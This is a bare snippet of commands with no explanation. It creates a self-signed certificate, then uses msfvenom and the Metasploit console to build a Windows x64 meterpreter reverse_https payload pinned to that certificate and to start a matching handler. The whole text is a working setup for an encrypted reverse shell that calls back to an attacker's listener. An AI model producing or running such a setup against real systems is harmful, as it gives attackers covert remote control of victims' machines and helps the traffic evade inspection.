openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
    -keyout www.example.com.key \
    -out www.example.com.crt && \
cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
rm -f www.example.com.key  www.example.com.crt

------------------------------------------------------------------------------------

msfvenom -p windows/x64/meterpreter/reverse_https LHOST= LPORT= HandlerSSLCert=/../../../www.example.com.pem StagerVerifySSLCert=true -f raw -o code.bin

msf > use auxiliary/multi/handler
msf > use payload/windows/x64/meterpreter/reverse_https
msf > set HandlerSSLCert /../../../www.example.com.pem
msf > set StagerVerifySSLCert true
